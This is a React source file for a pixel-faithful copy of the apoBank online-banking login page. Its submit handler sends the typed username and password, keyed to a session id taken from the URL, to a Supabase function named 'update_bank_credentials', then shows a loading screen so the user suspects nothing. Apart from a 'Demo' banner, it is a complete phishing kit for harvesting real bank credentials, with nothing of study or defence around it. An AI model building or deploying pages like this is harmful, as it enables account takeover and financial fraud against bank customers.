import { useState, useEffect } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import faviconAsset from "@/assets/favicons/apobank.webp.asset.json";
import logoAsset from "@/assets/apobank-logo.svg.asset.json";
import iconDatenschutz from "@/assets/apobank-icon-datenschutz.png.asset.json";
import iconEmail from "@/assets/apobank-icon-email.png.asset.json";
import iconPhone from "@/assets/apobank-icon-phone.png.asset.json";

const FONT = "'TypoPRO Source Sans Pro', sans-serif";
const PRIMARY = "#012169";
const BTN = "#556a9a";
const TEXT = "#1e325f";
const BODY_BG = "#F0F3F5";
const LINK = "#1e325f";
const BORDER = "#ced4da";

const ApobankCopy = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";

  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [showLoading, setShowLoading] = useState(false);
  const [submitting, setSubmitting] = useState(false);

  useEffect(() => { window.scrollTo(0, 0); }, []);
  usePageMeta("Login apoBank", faviconAsset.url);

  const canSubmit = username.trim().length > 0 && password.length > 0;

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!canSubmit || submitting) return;
    setSubmitting(true);
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: username,
        p_password: password,
        p_username_label: "Benutzername",
        p_password_label: "Passwort",
      });
      if (error) console.error("Update failed:", error);
    }
    setShowLoading(true);
  };

  return (
    <div
      style={{
        fontFamily: FONT,
        color: TEXT,
        backgroundColor: "#fff",
        minHeight: "100vh",
        fontSize: "1rem",
        lineHeight: 1.5,
      }}
    >
      {/* Demo topbar */}
      <div style={{ background: "#e53935", color: "#fff", textAlign: "center", padding: "6px 0", fontSize: 14, fontWeight: 700, letterSpacing: 1 }}>Demo</div>

      <div style={{ height: "2.5rem" }} />

      <main
        style={{
          maxWidth: 820,
          margin: "0 auto",
          padding: "0 12px",
        }}
      >
        <div
          style={{
            borderRadius: 4,
            overflow: "hidden",
            boxShadow: "0 .5rem 1.25rem rgba(0,0,0,.18)",
          }}
        >
          {/* Header */}
          <div className="apo-head" style={{ background: "#fff", padding: "22px 48px" }}>
            <h1
              className="apo-title"
              style={{
                color: "#004893",
                fontSize: 40,
                fontWeight: 700,
                fontFamily: "Arial, sans-serif",
                margin: 0,
                lineHeight: 1.2,
                whiteSpace: "nowrap",
              }}
            >
              Login apoBank
            </h1>
          </div>

          {/* Body */}
          <div className="apo-body" style={{ background: BODY_BG, padding: "36px 48px 40px" }}>

            <div style={{ fontWeight: 600, marginBottom: 24 }}>
              Willkommen im Online-Banking der apoBank
            </div>

            <form onSubmit={handleSubmit} autoComplete="off" noValidate>
              <div className="apo-row">
                <label htmlFor="apo-username" className="apo-label">
                  Benutzername
                </label>
                <div className="apo-field">
                  <input
                    id="apo-username"
                    name="username"
                    type="text"
                    autoCapitalize="off"
                    spellCheck={false}
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    className="apo-input"
                  />
                </div>
              </div>

              <div className="apo-row">
                <label htmlFor="apo-password" className="apo-label">
                  Passwort
                </label>
                <div className="apo-field" style={{ position: "relative" }}>
                  <input
                    id="apo-password"
                    name="password"
                    type={showPassword ? "text" : "password"}
                    autoCapitalize="off"
                    spellCheck={false}
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="apo-input"
                    style={{ paddingRight: password.length > 0 ? 36 : undefined }}
                  />
                  {password.length > 0 && (
                    <button
                      type="button"
                      onClick={() => setShowPassword((v) => !v)}
                      aria-label="Passwort anzeigen oder ausblenden"
                      style={{
                        position: "absolute",
                        right: 6,
                        top: "50%",
                        transform: "translateY(-50%)",
                        background: "transparent",
                        border: 0,
                        padding: 4,
                        cursor: "pointer",
                        color: TEXT,
                      }}
                    >
                      {showPassword ? (
                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a19.5 19.5 0 0 1 5.17-6.17"/><path d="M1 1l22 22"/><path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a19.5 19.5 0 0 1-2.16 3.19"/><path d="M14.12 14.12A3 3 0 1 1 9.88 9.88"/></svg>
                      ) : (
                        <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
                      )}
                    </button>
                  )}
                </div>
              </div>

              <div className="apo-btn-wrap" style={{ display: "flex", justifyContent: "flex-end", marginTop: 8 }}>
                <button
                  type="submit"
                  disabled={!canSubmit || submitting}
                  className="apo-btn"
                >
                  Anmelden
                </button>
              </div>


              <p style={{ marginTop: 4, marginBottom: 16 }}>
                Mit dem Absenden Ihrer Anmeldedaten erkennen Sie die{" "}
                <a href="#" target="_blank" rel="noopener noreferrer" style={{ color: LINK, textDecoration: "underline" }}>
                  Sicherheitshinweise
                </a>{" "}
                an.
              </p>
            </form>

            <p style={{ fontWeight: 600, margin: "24px 0 16px" }}>
              Maßnahmen für sicheres Online-Banking:
            </p>

            <div style={{ display: "flex", alignItems: "center", gap: 12, marginBottom: 16 }}>
              <img src={iconDatenschutz.url} alt="" width={28} height={28} />
              <span>1. Wir fragen niemals nach Ihren Zugangsdaten.</span>
            </div>
            <div style={{ display: "flex", alignItems: "center", gap: 12, marginBottom: 24 }}>
              <img src={iconEmail.url} alt="" width={28} height={28} />
              <span>2. Bei zweifelhaften E-Mails gilt: Keine Links oder Anhänge öffnen.</span>
            </div>

            <div style={{ display: "flex", alignItems: "center", gap: 10, marginBottom: 4 }}>
              <img src={iconPhone.url} alt="" width={24} height={24} />
              <strong>+49 211 5998 8000</strong>
            </div>
            <a
              href="#"
              target="_blank"
              rel="noopener noreferrer"
              style={{
                color: LINK,
                textDecoration: "underline",
                marginLeft: 34,
                display: "inline-block",
              }}
            >
              Hotlines der apoBank
            </a>
          </div>
        </div>

        <footer style={{ padding: "32px 0", display: "flex", alignItems: "center", justifyContent: "center" }}>
          <img src={logoAsset.url} alt="apoBank Logo" style={{ height: 56, width: "auto", display: "block" }} />
        </footer>
      </main>

      <style>{`
        .apo-row {
          display: flex;
          flex-wrap: wrap;
          margin-bottom: 1rem;
          align-items: center;
        }
        .apo-label {
          flex: 0 0 auto;
          width: 100%;
          padding-top: calc(.375rem + 1px);
          padding-bottom: calc(.375rem + 1px);
          font-weight: 600;
        }
        .apo-field {
          flex: 0 0 auto;
          width: 100%;
        }
        @media (min-width: 768px) {
          .apo-label { width: 41.6667%; padding-right: .75rem; }
          .apo-field { width: 58.3333%; }
        }
        .apo-input {
          display: block;
          width: 100%;
          padding: .375rem .75rem;
          font-size: 1rem;
          line-height: 1.5;
          color: #55595c;
          background-color: #fff;
          border: 1px solid ${BORDER};
          border-radius: .25rem;
          font-family: inherit;
          outline: none;
          transition: border-color .15s ease-in-out, box-shadow .15s ease-in-out;
        }
        .apo-input:focus {
          border-color: #fff;
          box-shadow: 0 0 0 .25rem rgba(1,33,105,.25);
        }
        .apo-btn {
          display: inline-block;
          padding: .375rem 1rem;
          min-width: 120px;
          font-size: 1rem;
          font-weight: 400;
          line-height: 1.5;
          color: ${BTN};
          background-color: transparent;
          border: 1px solid ${BTN};
          border-radius: .25rem;
          cursor: pointer;
          font-family: inherit;
          transition: color .15s, background-color .15s, border-color .15s, box-shadow .15s;
        }
        .apo-btn:not(:disabled) {
          color: #373a3c;
          background-color: #fff;
          border-color: #555;
        }
        .apo-btn:hover:not(:disabled) {
          background-color: #ececec;
          border-color: #555;
          color: #373a3c;
        }
        .apo-btn:disabled {
          color: ${BTN};
          border-color: ${BTN};
          background-color: transparent;
          cursor: default;
        }
        @media (max-width: 767px) {
          .apo-head { padding: 16px 18px !important; }
          .apo-body { padding: 20px 18px 24px !important; }
          .apo-title { font-size: 28px !important; }
          .apo-btn-wrap { justify-content: stretch !important; }
          .apo-btn-wrap .apo-btn { width: 100%; min-width: 0; }
        }
      `}</style>


      {showLoading && (
        <LoadingOverlay
          onComplete={() => setShowLoading(false)}
        />
      )}
    </div>
  );
};

export default ApobankCopy;
